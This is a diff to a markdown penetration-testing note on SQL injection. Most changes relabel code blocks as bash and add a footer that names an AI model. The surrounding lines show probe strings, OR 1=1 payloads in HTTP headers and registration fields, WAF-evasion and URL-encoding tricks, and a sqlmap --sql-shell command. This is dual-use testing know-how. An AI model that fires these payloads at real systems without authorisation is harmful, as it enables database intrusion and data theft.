@@ -2,7 +2,7 @@
 
 #SQLi #SQLInjection #injection #WebAppAttacks
 
-## What Is SQLi
+## What is this?
 
 SQL injection occurs when unsanitized user input is inserted directly into a SQL query, allowing an attacker to modify query logic, dump data, write files, or execute OS commands.
 
@@ -35,7 +35,7 @@ SQL injection occurs when unsanitized user input is inserted directly into a SQL
 
 **Basic probes** — look for errors, changed output, or delays:
 
-```
+```bash
 '
 ''
 `
@@ -330,7 +330,7 @@ Headers are often logged to a DB (analytics, audit logs, session tracking). Test
 
 **Common injectable headers:**
 
-```
+```bash
 User-Agent: Mozilla' OR 1=1-- -
 X-Forwarded-For: 1' OR 1=1-- -
 Referer: ' OR 1=1-- -
@@ -423,7 +423,7 @@ Input is stored safely (no immediate injection) but later retrieved and used in 
 - Hard to detect with automated scanners
 
 **Test methodology:**
-```
+```bash
 1. Register/create account with payloads in name fields:
    - admin'-- -
    - test' OR 1=1-- -
@@ -534,14 +534,14 @@ SE/**/LECT user/**/()
 ```
 
 ### URL encoding
-```
+```bash
 %27 = '
 %20 = space
 %2B = +
 ```
 
 ### Double URL encoding
-```
+```bash
 %2527 = %27 = '
 ```
 
@@ -696,7 +696,7 @@ sqlmap -u "http://target.com/page?id=1" --sql-shell
 
 ## Quick Reference Checklist
 
-```
+```bash
 1. Identify injection points
    - All GET/POST params, cookies, headers
    - JSON body fields
@@ -747,3 +747,9 @@ sqlmap -u "http://target.com/page?id=1" --sql-shell
 ```
 
 > For NoSQL injection (MongoDB, Redis, CouchDB) see [[NoSQL Injection]]
+
+---
+
+*Created: 2026-02-27*
+*Updated: 2026-05-13*
+*Model: claude-sonnet-4-6*
